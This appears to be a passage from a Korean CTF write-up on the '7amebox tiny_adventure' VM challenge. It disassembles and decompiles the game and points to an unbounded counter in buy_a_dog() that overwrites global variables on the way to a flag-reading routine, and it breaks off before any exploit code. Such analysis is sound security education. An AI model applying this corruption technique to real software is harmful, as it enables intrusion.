# Index

- [Summary](#Summary)
- [Analysis](#Analysis)
- [Decompile in C](#Decompile-in-C)

- [Vulnerability](#Vulnerability)
- [Exploit](#Exploit)
- [Comment](#Comment)



# Summary

- **VM**
- **No Boundary Check**
- **살려ㅈ..**



# Analysis

다행스럽게도 **VM** 환경은 저번 문제와 동일하기 때문에 **Disassembler**는 그대로 쓰면 됩니다. 물논 분석할 코드의 양이 꽤나 늘어났지만 시간많은 백수는 늘 그렇듯 해낼 수 있습니다.

```asm
   0 :  sub r12, #0x3
   5 :  mov3 r2, #0x6
   a :  mov3 r1, r12
   c :  mov3 r0, #0x4
  11 :  syscall 0		# <== allocate(0xf5fdd, 6) addr: 0x1000
  13 :  mov3 r10, [r1]
  15 :  call [r13+ #0x4]	# <== main()
  1a :  xor r0, r0
  1c :  syscall 0		# <== exit()
  
_sub_01e # <== main()
  1e :  push r11
  20 :  mov3 r11, r12
  22 :  sub r12, #0x6
  27 :  mov3 r0, #0x6e2
  2c :  call [r13+ #0x674]		# <== call _sub_6a5() # print_content(0x6e2) "==..."
  31 :  call [r13+ #0xcd]		# <== call _sub_103() # load_stage()
  36 :  call [r13+ #0x174]		# <== call _sub_1af() # check ? return 1
  3b :  cmp r0, #0x0
  40 :  je [r13+ #0xb8]			# -> return
  45 :  mov3 r0, #0xaa9			# 0xaa9 : "1) show current map.2)...."
  4a :  call [r13+ #0x656]		# <== call _sub_6a5() # print_content(0xaa9)
  4f :  mov3 r5, r11
  51 :  sub r5, #0x6
  56 :  mov3 [r5], r15
  58 :  mov3 r1, #0x3
  5d :  mov3 r0, r5
  5f :  call [r13+ #0x605]		# <== call _sub_669() # read(0, bp-0x6, 0x3)
  64 :  xor r6, r6
  66 :  mov3 r5, r11
  68 :  sub r5, #0x6
  6d :  mov1 r6, [r5]
  6f :  cmp1 r6, #0x31			# <== case = '1'	show current map
  74 :  jne [r13+ #0xa]			
  79 :  call [r13+ #0x168]			# call _sub_1e6() show_map()
  7e :  jmp [r13+ #0x75]			# jmp 0xf8
  83 :  cmp1 r6, #0x32			# <== case = '2'	buy a dog
  88 :  jne [r13+ #0xa]
  8d :  call [r13+ #0x1ca]			# call _sub_25c()
  92 :  jmp [r13+ #0x61]			# jmp 0xf8
  97 :  cmp1 r6, #0x33			# <== case = '3'	sell a dog
  9c :  jne [r13+ #0xa]
  a1 :  call [r13+ #0x25e]			# call _sub_304()
  a6 :  jmp [r13+ #0x4d]			# jmp 0xf8
  ab :  cmp1 r6, #0x34			# <== case = '4'	direction help
  b0 :  jne [r13+ #0xf]
  b5 :  mov3 r0, #0x8f7				# 0x8f7: "direction..."
  ba :  call [r13+ #0x5e6]			# call _sub_6a5() # print_content(0x8f7)
  bf :  jmp [r13+ #0x34]			# jmp 0xf8
  c4 :  cmp1 r6, #0x77			# <== case = 'w'
  c9 :  je [r13+ #0x23]				# jmp 0xf1
  ce :  cmp1 r6, #0x61			# <== case = 'a'
  d3 :  je [r13+ #0x19]				# jmp 0xf1
  d8 :  cmp1 r6, #0x73			# <== case = 's'
  dd :  je [r13+ #0xf]				# jmp 0xf1
  e2 :  cmp1 r6, #0x64			# <== case = 'd'
  e7 :  je [r13+ #0x5]				# jmp 0xf1
  ec :  jmp [r13+ #0x7]		# default jmp 0xf8
  f1 :  mov3 r0, r6
  f3 :  call [r13+ #0x28b]		#	call sub_383 # moving(input)
  f8 :  jmp [r13+ #0x1fff39]	#	jmp	 0x36
  fd :  mov3 r12, r11
  ff :  pop r11
 101 :  pop r13
 
_sub_103		# <== load_stage()
 103 :  push r11
 105 :  mov3 r11, r12
 107 :  sub r12, #0x6
 10c :  mov3 r5, r10
 10e :  mov3 [r5], r15			# [0x1000] = 0
 110 :  mov3 r5, r10
 112 :  add r5, #0x3
 117 :  mov3 r2, #0x100
 11c :  mul r2, #0x3
 121 :  mov3 r1, #0x0
 126 :  mov3 r0, r5
 128 :  call [r13+ #0x4ee]		# <== call _sub_61b(0x1003, 0x0, 0x100)	# memset()
 12d :  mov3 r5, r10
 12f :  add r5, #0x306
 134 :  mov3 r6, #0x6
 139 :  mov3 [r5], r6			# [0x1306] = 0x6	# sell_num = 0x6
 13b :  mov3 r5, r10
 13d :  add r5, #0x309
 142 :  mov3 r6, #0x78			# [0x1309] = 0x78	# health = 0x78
 147 :  mov3 [r5], r6
 149 :  mov3 r5, r10
 14b :  add r5, #0x30c			
 150 :  mov3 r6, #0x61			# [0x130c] = 0x61	# attack = 0x61
 155 :  mov3 [r5], r6
 157 :  mov3 r5, r10
 159 :  add r5, #0x30f
 15e :  mov3 [r5], r15			# [0x130f] = 0		# column x좌표 = 0
 160 :  mov3 r5, r10
 162 :  add r5, #0x312
 167 :  mov3 [r5], r15			# [0x1312] = 0		# row y좌표 = 0
 169 :  mov3 r2, #0x6
 16e :  mov3 r5, r11
 170 :  sub r5, #0x6
 175 :  mov3 r1, r5
 177 :  mov3 r0, #0x4
 17c :  syscall 0			# <== allocate(bp-0x6, 0x6) # 6: read, write
 17e :  mov3 r7, [r1]			# bp-0x6 에 새로 할당받은 주소 저장. r7에도 저장
 180 :  mov3 r5, r10
 182 :  add r5, #0x303
 187 :  mov3 [r5], r7		#	[0x1303] = r7		# 새로 할당받은 주소
 189 :  mov3 r5, #0xe7f		# 0xe7f: stage.map
 18e :  mov3 r1, r5
 190 :  mov3 r0, #0x1
 195 :  syscall 0			# <== open("stage.map")
 197 :  mov3 r3, #0xe10
 19c :  mov3 r2, r7			# r2 = 새로 할당받은 주소
 19e :  mov3 r1, r0
 1a0 :  mov3 r0, #0x3
 1a5 :  syscall 0			# <== read(2, 0x59000, 0xe10)
 1a7 :  mov3 r0, r2
 1a9 :  mov3 r12, r11
 1ab :  pop r11
 1ad :  pop r13
 
_sub_1af()		# <== check() health!
 1af :  push r11
 1b1 :  mov3 r11, r12
 1b3 :  sub r12, #0x6
 1b8 :  call [r13+ #0x3f5]		# <== call _sub_5b2() return [0x1309]
 1bd :  cmp r0, #0x0		#	[0x1309] > 0
 1c2 :  ja [r13+ #0x14]		# <== ja 0x1db return 1;
 1c7 :  mov3 r0, #0xc66
 1cc :  call [r13+ #0x4d4]		# <== call print_content(0xc66) "====...you died!.."
 1d1 :  mov3 r0, #0x0
 1d6 :  jmp [r13+ #0x5]		# <== jmp 0x1e0
 1db :  mov3 r0, #0x1
 1e0 :  mov3 r12, r11
 1e2 :  pop r11
 1e4 :  pop r13
 
_sub_1e6		# show current map()
 1e6 :  push r11
 1e8 :  mov3 r11, r12
 1ea :  sub r12, #0x3
 1ef :  mov3 r0, #0x9c5
 1f4 :  call [r13+ #0x4ac]		#	print_content(0x9c5) "-------... * ..power up"
 1f9 :  mov3 r0, #0xb6c
 1fe :  call [r13+ #0x4a2]		#	print_content(0xb6c) "#######....##"
 203 :  call [r13+ #0x39d]		#	call _sub_5a5() get_map_addr	return 0x59000
 208 :  mov3 r7, r0(0x59000)	# <== r7 은 map 주소로 사용됨!
 20a :  xor r6, r6
 20c :  cmp r6, #0x3c		# map height = 0x3c
 211 :  je [r13+ #0x36]			#	jmp 0x24c 
 216 :  mov3 r1, #0x1
 21b :  mov3 r0, #0xbe0
 220 :  call [r13+ #0x462]		#	call _sub_687() write(1, 0xbe0, 1) 
 225 :  mov3 r1, #0x3c				print left wall
 22a :  mov3 r0, r7
 22c :  call [r13+ #0x456]		#	call _sub_687() write(1, r7, 0x3c)
 231 :  mov3 r1, #0x2				print map
 236 :  mov3 r0, #0xbe2
 23b :  call [r13+ #0x447]		#	call _sub_687() write(1, 0xbe2, 1)
 240 :  add r7, #0x3c	< add r7 	print right wall
 245 :  inc r6
 247 :  jmp [r13+ #0x1fffc0]	#	jmp 0x20c
 24c :  mov3 r0, #0xb6c
 251 :  call [r13+ #0x44f]		#	call print_content(0xb6c) "#####..###"
 256 :  mov3 r12, r11
 258 :  pop r11
 25a :  pop r13
 
_sub_25c()			# <==  buy a dog
 25c :  push r11
 25e :  mov3 r11, r12
 260 :  sub r12, #0x6
 265 :  mov3 r2, #0x6
 26a :  mov3 r5, r11
 26c :  sub r5, #0x3
 271 :  mov3 r1, r5
 273 :  mov3 r0, #0x4
 278 :  syscall r0			# allocate(bp-0x3, 6)	normal return 1	addr 0xc4000
 27a :  cmp r0, #0x0		# check error
 27f :  je [r13+ #0x70]		# jmp 0x2f4 -> "you alread too many"
 284 :  mov3 r5, r10
 286 :  mov3 r6, [r5]		# r6 = *(0x1000)
 288 :  inc r6				# r6++
 28a :  mov3 [r5], r6		# *(0x1000)++
 28c :  mul r6, #0x3		
 291 :  add r6, r10			# r6 = 0x1000 + r6*0x3	
 293 :  mov3 r5, r11
 295 :  sub r5, #0x3
 29a :  mov3 r5, [r5]		# r5 = *(bp-0x3)
 29c :  mov3 [r6], r5		# *(r6) = r5			<======= vulner!!
 29e :  mov3 r0, #0xbe7
 2a3 :  call [r13+ #0x3fd]		#	call print_content(0xbe7) "do you...(y/n)>"
 2a8 :  mov3 r1, #0x3
 2ad :  mov3 r5, r11
 2af :  sub r5, #0x6			# 	bp-0x6
 2b4 :  mov3 r0, r5
 2b6 :  call [r13+ #0x3ae]		#	call _read(0, bp-0x6, 0x3)
 2bb :  mov3 r5, r11
 2bd :  sub r5, #0x6
 2c2 :  xor r6, r6
 2c4 :  mov1 r6, [r5]
 2c6 :  cmp1 r6, #0x79			# 'y'
 2cb :  jne [r13+ #0x15]
 2d0 :  mov3 r1, #0x1000
 2d5 :  mov3 r5, r11
 2d7 :  sub r5, #0x3
 2dc :  mov3 r6, [r5]
 2de :  mov3 r0, r6
 2e0 :  call [r13+ #0x384]		#	call _read(0, *(bp-0x3), 0x1000)
 2e5 :  mov3 r0, #0xc18
 2ea :  call [r13+ #0x3b6]		#	call print_content(0xc18) "you got a new dog..."
 2ef :  jmp [r13+ #0xa]			# 	jmp 0x2fe
 2f4 :  mov3 r0, #0xc45
 2f9 :  call [r13+ #0x3a7]		#	call print_content(0xc45) "you alread have..."
 2fe :  mov3 r12, r11
 300 :  pop r11
 302 :  pop r13
 
_sub_304()			# <==	sell a dog
 304 :  push r11
 306 :  mov3 r11, r12
 308 :  sub r12, #0x6
 30d :  mov3 r5, r10
 30f :  add r5, #0x306		# 	r5 = 0x1306
 314 :  mov3 r6, [r5]		# 	r6 = [0x1306] 처음에 6, sell 할 때마다 1씩 감소
 316 :  cmp r6, #0x0		# 	cmp 0
 31b :  je [r13+ #0x53]		# 	je 0x373 -> print you can't sell
 320 :  dec r6				#	-1
 322 :  mov3 [r5], r6
 324 :  mov3 r0, #0xbac
 329 :  call [r13+ #0x377]		#	call print_content(0xbac) "which dog..sell?"
 32e :  mov3 r1, #0x4
 333 :  mov3 r5, r11
 335 :  sub r5, #0x6
 33a :  mov3 r0, r5
 33c :  call [r13+ #0x328]		#	call _read(0, (bp-0x6)(0xf5fc5), 0x4)
 341 :  mov3 r5, r11
 343 :  sub r5, #0x6
 348 :  mov3 r6, [r5]			#	r5 = [bp-0x6](0xf5fc5)
 34a :  cmp r6, #0x100000		#	*(bp-0x6) < 0x100000
 34f :  jb [r13+ #0x1f]			# 	jb 0x373 -> print you can't sell
 354 :  mov3 r5, r11
 356 :  sub r5, #0x6
 35b :  mov3 r1, [r5]
 35d :  mov3 r0, #0x6
 362 :  syscall 0				#	page free(*(bp-0x6))
 364 :  mov3 r0, #0xbcd
 369 :  call [r13+ #0x337]		#	call print_content(0xbcd) "goodbye my dog.."
 36e :  jmp [r13+ #0xa]			#	jmp 0x37d -> return
 373 :  mov3 r0, #0xc2c
 378 :  call [r13+ #0x328]		#	call print_content(0xc2c) "you can't sell..."
 37d :  mov3 r12, r11
 37f :  pop r11
 381 :  pop r13
 
_sub_383()			# <==	moving()
 383 :  push r11
 385 :  mov3 r11, r12
 387 :  sub r12, #0xc
 38c :  mov3 r5, r11
 38e :  sub r5, #0x3
 393 :  mov1 r0, [r5]			#	[bp-0x3]
 395 :  call [r13+ #0x20b]		#	call _sub_5a5 # get_map_addr() [0x1303] 
 39a :  mov3 r5, r11
 39c :  sub r5, #0x9
 3a1 :  mov3 [r5], r0			# [bp-0x9] <= r0(0x59000)
 3a3 :  mov3 r5, r10
 3a5 :  add r5, #0x30f
 3aa :  mov3 r8, [r5]			# r8 = [0x130f]	<= 현재 위치의 가로 값 column
 3ac :  mov3 r5, r10
 3ae :  add r5, #0x312
 3b3 :  mov3 r9, [r5]			# r9 = [0x1312] <= 현재 위치의 높이 값 row
 3b5 :  mov3 r5, r0				# r5 = map 주소
 3b7 :  mov3 r6, r9				
 3b9 :  mul r6, #0x3c			# r6=r9*0x3c  # map 의 크기는 0x3c X 0x3c 이다
 3be :  add r5, r6
 3c0 :  add r5, r8				#	r5 = map 주소 + 현재 위치
 3c2 :  xor r6, r6
 3c4 :  mov1 r6, [r5]			#	r6 = 현재 위치의 값
 3c6 :  cmp1 r6, #0x40			#	r6 == '@'
 3cb :  jne [r13+ #0x7]			#	jne 0x3d7	# 이동 외의 이벤트
 3d0 :  mov3 r6, #0x20			# 	그냥 이동 이벤트이므로,
 3d5 :  mov1 [r5], r6			#	현재 위치에는 공백을 저장
 3d7 :  xor r6, r6				
 3d9 :  mov3 r5, r11			
 3db :  sub r5, #0x3
 3e0 :  mov1 r6, [r5]			#	r6 = [bp-0x3]
 3e2 :  cmp1 r6, #0x77			#	'w'
 3e7 :  jne [r13+ #0xc]			#	jne 0x3f8
 3ec :  dec r9					# 	dec row
 3ee :  mod r9, #0x3c			
 3f3 :  jmp [r13+ #0x33]		#	jmp	0x42b
 3f8 :  cmp1 r6, #0x61			#	'a'
 3fd :  jne [r13+ #0xc]			#	jne	0x40e
 402 :  dec r8					#	dec column
 404 :  mod r8, #0x3c			
 409 :  jmp [r13+ #0x1d]		#	jmp	0x42b
 40e :  cmp1 r6, #0x73			#	's'
 413 :  jne [r13+ #0xc]			# 	jne	0x424
 418 :  inc r9					#	inc	row
 41a :  mod r9, #0x3c			
 41f :  jmp [r13+ #0x7]			#	jmp	0x42b	
 424 :  inc r8					#	inc column 'd'
 426 :  mod r8, #0x3c			
 42b :  mov3 r5, r10			
 42d :  add r5, #0x30f
 432 :  mov3 [r5], r8			#	[0x130f] = r8  save column
 434 :  mov3 r5, r10
 436 :  add r5, #0x312
 43b :  mov3 [r5], r9			#	[0x1312] = r9  save row
 43d :  mov3 r5, r11
 43f :  sub r5, #0x9
 444 :  mov3 r5, [r5]			#	r5 = [bp-0x9](0x59000)
 446 :  mov3 r6, r9
 448 :  mul r6, #0x3c
 44d :  add r5, r6
 44f :  add r5, r8				#	r5 = 현재 위치의 메모리 주소
 451 :  mov3 r6, r11
 453 :  sub r6, #0xc
 458 :  mov3 [r6], r5			#	[bp-0xc] = 현재 위치 메모리 주소(0x5903b)
 45a :  xor r6, r6
 45c :  mov1 r6, [r5]			#	r6 = 현재 위치 값(움직인뒤)
 45e :  mov3 r7, #0x40		
 463 :  mov1 [r5], r7			#	[r5] = @
 465 :  cmp1 r6, #0x20			#	' '
 46a :  je [r13+ #0x130]		#	je	0x59f
 46f :  cmp1 r6, #0x2a			#	'*'
 474 :  je [r13+ #0x8c]			#	je	0x505		'*' power up
 479 :  cmp1 r6, #0x7a			#	'z' boss
 47e :  je [r13+ #0xb1]			#	je	0x534		'z' boss
 483 :  cmp1 r6, #0x61			#	'a'
 488 :  jb [r13+ #0x112]		#	jb	0x59f		'a'~'y' monster
 48d :  cmp1 r6, #0x7a			#	'z'
 492 :  ja [r13+ #0x108]		#	ja	0x59f
 497 :  mov3 r0, #0xb07
 49c :  call [r13+ #0x204]		#	call print_content(0xb07) "you met a monster"
 4a1 :  mov3 r1, #0x3
 4a6 :  mov3 r5, r11
 4a8 :  sub r5, #0x6
 4ad :  mov3 r0, r5
 4af :  call [r13+ #0x1b5]		#	call _read(0, bp-0x6, 0x3)
 4b4 :  mov3 r5, r10
 4b6 :  add r5, #0x309
 4bb :  mov3 r7, [r5]			#	r7 = [0x1309]
 4bd :  cmp r7, #0x1e			#	[0x1309] < '.'
 4c2 :  jb [r13+ #0xc]			#	jb	0x4d3
 4c7 :  sub r7, #0x1e
 4cc :  mov3 [r5], r7			#	[0x1309] -= 0x1e
 4ce :  jmp [r13+ #0x2]			#	jmp	0x4d5
 4d3 :  mov3 [r5], r15
# 0x4d5
 4d5 :  mov3 r5, r10		
 4d7 :  add r5, #0x30c
 4dc :  mov3 r7, [r5]			#	r7 = [0x130c]
 4de :  cmp r6, r7				#	'a'~'y' > [0x130c]
 4e0 :  ja [r13+ #0x10]			#	ja	0x4f5 -> return
 4e5 :  mov3 r5, r11
 4e7 :  sub r5, #0xc
 4ec :  mov3 r8, [r5]			#	*(bp-0xc) = current_location
 4ee :  mov3 r6, #0x2a			#	r6 = '*'
 4f3 :  mov1 [r8], r6			#	*(*(bp-0xc)) = r6
# 0x4f5
 4f5 :  mov3 r5, r11
 4f7 :  sub r5, #0xc
 4fc :  mov3 r8, [r5]			#	*(bp-0xc) = current_location
 4fe :  mov1 [r8], r6			#	*(current_location) = r6
 500 :  jmp [r13+ #0x9a]		#	jmp	0x59f -> return
# power up! 
 505 :  mov3 r5, r10			# <== power up
 507 :  add r5, #0x309
 50c :  mov3 r7, [r5]			#	r7 = [0x1309]
 50e :  add r7, #0x28			# 	r7 += 0x28
 513 :  mov3 [r5], r7			#	[0x1309] += 0x28
 515 :  mov3 r5, r10
 517 :  add r5, #0x30c
 51c :  mov3 r7, [r5]			#	r7 = [0x130c]
 51e :  add r7, #0x5			#	r7 += 0x5
 523 :  mov3 [r5], r7			#	[0x130c] += 0x5
 525 :  mov3 r0, #0xb61
 52a :  call [r13+ #0x176]		#	call print_content(0xb61) "power up!"
 52f :  jmp [r13+ #0x6b]		#	jmp 0x59f -> return
# 'z' boss
 534 :  mov3 r0, #0xb2f
 539 :  call [r13+ #0x167]		#	call print_content(0xb2f) "you met a boss.."
 53e :  mov3 r1, #0x3
 543 :  mov3 r5, r11
 545 :  sub r5, #0x6
 54a :  mov3 r0, r5
 54c :  call [r13+ #0x118]		#	call _read(0, bp-0x6, 0x3)
 551 :  mov3 r5, r10
 553 :  add r5, #0x309
 558 :  mov3 r7, [r5]
 55a :  cmp r7, #0x7d0			#	[0x1309] < 0x7d0
 55f :  jb [r13+ #0xc]			#	jb	0x570
 564 :  sub r7, #0x7d0
 569 :  mov3 [r5], r7			#	[0x1309] -= 0x7d0
 56b :  jmp [r13+ #0x2]			#	jmp 0x572
 570 :  mov3 [r5], r15
 572 :  mov3 r5, r10			
 574 :  add r5, #0x30c		
 579 :  mov3 r7, [r5]
 57b :  cmp r7, #0x2bc			#	[0x130c] < 0x2bc
 580 :  jb [r13+ #0xa]			#	jb	0x58f
 585 :  call [r13+ #0x35]		#	call	read_flag()!!!!!
 58a :  jmp [r13+ #0x10]		#	jmp	0x59f -> return
 58f :  mov3 r5, r11
 591 :  sub r5, #0xc
 596 :  mov3 r8, [r5]			#	r8 = [bp-0xc] <= current location 저장
 598 :  mov1 [r8], r6			#	*(*(bp-0xc)) = r6 기존 존재하던 값 저장
 59a :  jmp [r13+ #0x0]			#	nop
 59f :  mov3 r12, r11
 5a1 :  pop r11
 5a3 :  pop r13
 
_sub_5a5()		# 			<== get_map_addr..??
 5a5 :  mov3 r5, r10	# r10 = 0x1000
 5a7 :  add r5, #0x303
 5ac :  mov3 r6, [r5]	# r5 = 0x1303
 5ae :  mov3 r0, r6		# r6 = 0x59000
 5b0 :  pop r13
 
_sub_5b2()		# 		<== return [0x1309]
 5b2 :  mov3 r5, r10
 5b4 :  add r5, #0x309		
 5b9 :  mov3 r6, [r5]		# <== r5 = 0x1309
 5bb :  mov3 r0, r6
 5bd :  pop r13			# <== r0 = 0x78
 
_sub_5bf()		# <== read_flag()!!!!!!!!!!!!!!!!!!!!
 5bf :  push r11
 5c1 :  mov3 r11, r12
 5c3 :  sub r12, #0x3c
 5c8 :  mov3 r2, #0x3c
 5cd :  mov3 r1, #0x0
 5d2 :  mov3 r5, r11
 5d4 :  sub r5, #0x3c
 5d9 :  mov3 r0, r5
 5db :  call [r13+ #0x3b]		# call  memset(bp-0x3c, 0x0, 0x3c)
 5e0 :  mov3 r1, #0xe7a
 5e5 :  mov3 r0, #0x1
 5ea :  syscall 0		# <== open("flag")
 5ec :  mov3 r3, #0x3c
 5f1 :  mov3 r5, r11
 5f3 :  sub r5, #0x3c
 5f8 :  mov3 r2, r5
 5fa :  mov3 r1, r0
 5fc :  mov3 r0, #0x3
 601 :  syscall 0		# <== read(0, bp-0x3, 0x3)
 603 :  mov3 r5, r11
 605 :  sub r5, #0x3c
 60a :  mov3 r0, r5
 60c :  call [r13+ #0x94]	# <== call print_content(bp-0x3)
 611 :  xor r0, r0
 613 :  syscall 0		# <== exit()
 615 :  mov3 r12, r11
 617 :  pop r11
 619 :  pop r13
 
_sub_61b()		# <== memset()
 61b :  push r0
 61d :  push r1
 61f :  push r2
 621 :  cmp r2, #0x0	처음 : 0x300 -> 0x0  memset(r0(0x1003), r1(0x0), r2(0x300))
 626 :  je [r13+ #0xb]		# jmp 0x636
 62b :  mov1 [r0], r1
 62d :  inc r0
 62f :  dec r2
 631 :  jmp [r13+ #0x1fffeb] # jmp 0x621
 636 :  pop r2
 638 :  pop r1
 63a :  pop r0
 63c :  pop r13
 
_sub_63e()
 63e :  push r0
 640 :  push r1
 642 :  push r2
 644 :  push r3
 646 :  cmp r2, #0x0
 64b :  je [r13+ #0xf]
 650 :  mov1 r3, [r1]
 652 :  mov1 [r0], r3
 654 :  inc r0
 656 :  inc r1
 658 :  dec r2
 65a :  jmp [r13+ #0x1fffe7]
 65f :  pop r3
 661 :  pop r2
 663 :  pop r1
 665 :  pop r0
 667 :  pop r13
 
_sub_669()		# <== read()
 669 :  push r1
 66b :  push r2
 66d :  push r3
 66f :  mov3 r3, r1
 671 :  mov3 r2, r0
 673 :  mov3 r1, #0x0
 678 :  mov3 r0, #0x3
 67d :  syscall 0		# <== read() # read(0, r0, 0x3)
 67f :  pop r3
 681 :  pop r2
 683 :  pop r1
 685 :  pop r13
 
_sub_687()		# <== write() 
 687 :  push r1
 689 :  push r2
 68b :  push r3
 68d :  mov3 r3, r1
 68f :  mov3 r2, r0
 691 :  mov3 r1, #0x1
 696 :  mov3 r0, #0x2
 69b :  syscall r0		# <== write(r1, r2, r3)
 69d :  pop r3
 69f :  pop r2
 6a1 :  pop r1
 6a3 :  pop r13
 
_sub_6a5()		# <== print_content()
 6a5 :  push r0
 6a7 :  push r1
 6a9 :  mov3 r1, r0
 6ab :  call [r13+ #0xd]		# <== call _sub_6bd() # strlen()
 6b0 :  xchg r0, r1
 6b2 :  call [r13+ #0x1fffd0]		# <== call _sub_687() # write()
 6b7 :  pop r1
 6b9 :  pop r0
 6bb :  pop r13
 
 _sub_6bd()		# <== strlen()
 6bd :  push r1
 6bf :  push r2
 6c1 :  xor r1, r1
 6c3 :  xor r2, r2
 6c5 :  mov1 r2, [r0]
 6c7 :  cmp1 r2, #0x0		# <== check string last null
 6cc :  je [r13+ #0x9]
 6d1 :  inc r0
 6d3 :  inc r1
 6d5 :  jmp [r13+ #0x1fffeb]
 6da :  mov3 r0, r1
 6dc :  pop r2
 6de :  pop r1
 6e0 :  pop r13
```

왓더.. 뇌가 곤죽을 넘어 본죽이 되었지만 [디버깅](./7amebox-tiny_adventure_debug.md)하면서 어떻게든 위와 같이 정리할 수 있었습니다. ㅎ.. 하지만 어셈울렁증이 있던 저는 결국 **인간 아이다**가 되어 **C**로 만들어 내고 말았던 것입니다...!!



## Decompile in C

```c
int map_addr;	// 0x1303	
int sell_num;	// 0x1306
int health;		// 0x1309
int attack;		// 0x130c
int column;		// 0x130f
int row;		// 0x1312

void load_stage(){
    *(0x1000) = 0;
    memset(0x1003, 0x0, 0x100);	// initialize()
    
    sell_num = 0x6;	// 0x1306
    health = 0x78;	// 0x1309
    attack = 0x61;	// 0x130c
    column = 0;		// 0x130f
    row = 0;		// 0x1312
    map_addr = sys_allocate(bp-0x6, 0x6);//map을위한 메모리할당, bp-0x6에 할당받은 주소저장.
    fd = open("stage.map");
    read(fd, *(bp-0x6), 0xe10);			// 메모리에 map 저장.
}

void print_content(addr){
   	int size = strlen(addr);
   	write(1, addr, size);
}

void show_current_map(){
    int map_addr;// r7
    print_content(0x9c5);	//"-----...*..power up..."
    print_content(0xb6c);	//"####....##"
    map_addr = get_map_addr();	//_sub_5a5()
    for(int i=0;i<0x3c;i++){
        write(1, 0xbe0, 1);	//"#" left wall
        write(1, map_addr, 0x3c);	//"@..."
        write(1, 0xbe2, 1);	//"#" right wall
        map_addr += 0x3c;
    }
    print_content(0xb6c);	//"####....##"
}

void buy_a_dog(){
    
    if(!sys_allocate(bp-0x3, 6)){	// 6: 'rw', *(bp-0x3) = new allocated addr
        print_content(0xc45);	//"you alread have too many dog!"
    	return;
    }
    r6 = *(r10);	// 0 ... ~ , 0x1000
    r6++;
    *(r10) = r6;	// *(0x1000)++
    
    r6 = r10 + r6*0x3;	// 0x1003 ... ~ 0x1300 <== target  
    *(r6) = *(bp-0x3);	// <============================ vulner!!!
    
    
    print_content(0xbe7);	//"do you...? (y/n)"
    read(0, bp-0x6, 0x3);
    if(*(bp-0x6) == 'y' ):
    	read(0, *(bp-0x3), 0x1000);
    
    print_content(0xc18);	//"you got a new dog..."
}

void sell_a_dog(){
    if(sell_num == 0){
    	print_content(0xc2c);	//"you can't sell...."
    	return;
    }
    sell_num--;
    
    print_content(0xbac);	//"which dog...sell?"
    read(0, bp-0x6, 0x4);
    
    if( *(bp-0x6) < 0x100000){
        print_content(0xc2c);	//"you can't sell...."
    	return;
    }
    
    page_free(*(bp-0x6));
    print_content(0xbcd);	//"goodbye my dog..."
}

void moving(v0){ 	
    int map_addr;		//r0
    int cur_location;	//r5
    int cur_data;		//r6
    int r8;				//column
    int r9;				//row
    int select;			//[bp-0x3]
    
    map_addr = get_map_addr();
    *(bp-0x9) = map_addr;
    cur_location = map_addr + 0x3c*row + column;
    cur_data = *(cur_location);
    
    if(cur_data == '@'){
     	*(cur_location) = ' ';//그냥 이동 이벤트이므로 현재 위치에는 공백저장
    }
    select = v0;
    switch(select){
        case 'w':
            r9--;
            r9%=0x3c;	// 음수 값 보정
            break;
        case 'a':
            r8--;
            r8%=0x3c;
            break;
        case 's':
            r9++;
            r9%=0x3c;
            break;
        default :		// case 'd'
            r8++;
            r8%=0x3c;
    }
    column = r8;
    row = r9;
    r5 = *(bp-0x9) + r9 * 0x3c + r8;	//after location
    *(bp-0xc) = r5;	// save bp-0xc
    r6 = *(r5);	// 이동한 뒤, 기존에 저장되어 있던 값 r6에 저장.
    *(r5) = '@';
    switch(r6){
        case ' ':	// just moving
           	break;
        case '*':	// power up!
            health += 0x28;			// [0x1309]
            attack += 0x5;			// [0x130c]
            print_content(0xb61);	// "power up!"
            break;;
        case 'z':	// boss
            print_content(0xb2f);	// "you met a boss..." "1) attack 2) attack"	
            read(0, bp-0x6, 0x3);	
            if (health < 0x7d0)		//	[0x1309]
                health = r15;		// zero
            else
                health -= 0x7d0;	//	[0x1309]
            
            if (attach >= 0x2bc){	// [0x130c]
                read_flag();	//				 <=========== target!!!!
            	break;
            }
            *(r5) = r6;		// 현재 위치에 기존 값 저장
            break;
        case 'a' ... 'y':
            print_content(0xb07);	// "you met a monster"
            read(0, bp-0x6, 0x3);
            if (health < 0x1e)	//	[0x1309]
                health = r15;
            else
                health -= 0x1e;
            
            if (r6 <= attack)		//	[0x130c]
                r6 = '*';
            
            *(*(bp-0xc)) = r6;	//	*(current_location) = r6
        default:
            break;
    }
    return ;
}

bool check(){
    if( health > 0)		// [0x1309]
        return 1;
    else {
        print_content(0xc66);	// "=======...you died..."
        return 0;
    }
}

void main(){
    char select;//[bp-0x6]
    
    print_content(0x6e2);	// 0x6e2: "=========.... PWN ADVENTURE...."
    load_stage();
    while(check()){
    	
    	print_content(0xaa9);	// 0xaa9: "1) show current map. 2)...."
    	read(0, select, 0x3);	// bp-0x6
        switch(select){
            case '1':
                show_current_map();
                break;
            case '2':
                buy_a_dog();
                break;
            case '3':
                sell_a_dog();
                break;
            case '4':
                print_content(0x8f7);	// 0x8f7: "direction..."
                break;
            case 'w':
            case 'a':
            case 's':
            case 'd':
                moving(select);
                break;
            default:
                break;
        }
    }
    return;
}
```

[뿌듯] ..



## buy_a_dog()

```c
void buy_a_dog(){
    
    if(!sys_allocate(bp-0x3, 6)){	// 6: 'rw', *(bp-0x3) = new allocated addr
        print_content(0xc45);	//"you alread have too many dog!"
    	return;
    }
    r6 = *(r10);	// 0 ... ~ , 0x1000
    r6++;
    *(r10) = r6;	// *(0x1000)++
    
    r6 = r10 + r6*0x3;	// 0x1003 ... ~ 0x1300 <== target  
    *(r6) = *(bp-0x3);	// <============================ vulner!!!
    
    
    print_content(0xbe7);	//"do you...? (y/n)"
    read(0, bp-0x6, 0x3);
    if(*(bp-0x6) == 'y' ):
    	read(0, *(bp-0x3), 0x1000);
    
    print_content(0xc18);	//"you got a new dog..."
}
```

본 바이너리에서 가장 중요한 함수는 이 함수인 것 같습니다. 취약점은 여기서부터 시작됩니다. 



처음 **[0x1000]** 은 `load_stage()`를 통해 0으로 초기화됩니다. 이후 `buy_a_dog()`를 실행시킬 때마다 1씩 값을 증가시키며, `*(0x1000 + (*(0x1000))*0x3c)`에 `*(bp-0x3)`에 저장되어 있는 새로 할당받은 메모리 주소를 저장합니다. 이는 `load_stage()`가 불린 횟수에 따라 전역변수 공간으로 사용되는 **[0x1303]** ... **[0x1312]** 에 접근하여 해당 값들을 변조시킬 수 있음을 뜻합니다. 



자세한 어셈 코드는 다음과 같습니당

```asm
 284 :  mov3 r5, r10
 286 :  mov3 r6, [r5]		# r6 = *(0x1000)
